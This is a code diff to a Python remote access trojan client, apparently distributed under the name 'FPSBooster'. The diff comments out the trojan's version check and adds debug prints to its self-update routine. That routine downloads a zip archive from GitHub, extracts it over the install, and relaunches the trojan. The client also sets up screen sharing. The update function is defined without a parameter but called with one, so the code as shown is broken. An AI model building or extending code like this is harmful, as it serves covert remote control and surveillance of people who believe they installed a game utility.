@@ -72,7 +72,8 @@ class RAT_CLIENT:
         self.curdir = os.getcwd()
         self.command_history = []
 
-        self.check_version()
+        # TODO: Add a function to check if the RAT is up to date
+        # self.check_version()
 
         self.screenshareClient = ScreenShare()
 
@@ -156,14 +157,18 @@ class RAT_CLIENT:
         self.github_version = requests.get(
             "https://raw.githubusercontent.com/lukasolsen/FPSBooster/main/ver.txt"
         ).text.strip()
+        print("Github version:", self.github_version)
         # The text file should just look like this: 1.0.0
         # Open up our own version file and read the version
         with open("ver.txt", "r") as f:
             current_version = f.read().strip()
 
+        print("Current version:", current_version)
+
         if self.github_version != current_version:
             # The versions are different, so we need to update
             # Download the new version
+            print("Versions are different")
             self.download_new_version(self.github_version)
 
     def download_new_version(self):
@@ -171,6 +176,7 @@ class RAT_CLIENT:
         response = requests.get(
             "https://github.com/lukasolsen/FPSBooster/archive/main.zip")
         # Write the zip file to disk
+        print("Writing zip file to disk")
         with open("new_version.zip", "wb") as f:
             f.write(response.content)
         # Extract the zip file
@@ -178,15 +184,20 @@ class RAT_CLIENT:
             zip_ref.extractall()
         # Delete the zip file
         os.remove("new_version.zip")
+        print("Zip file deleted")
         # Delete the old version
         os.remove("ver.txt")
         # Rename the new version
+        print("Renaming new version")
         os.rename("FPSBooster-main", "FPSBooster")
         # Write the new version to a file
+        print("Writing new version to file")
         with open("ver.txt", "w") as f:
             f.write(self.github_version)
+        print("New version written to file")
         # Restart the RAT
         subprocess.Popen(["python", "main.pyw"])
+        print("Restarting RAT...")
         # Exit the current RAT
         sys.exit(0)
 
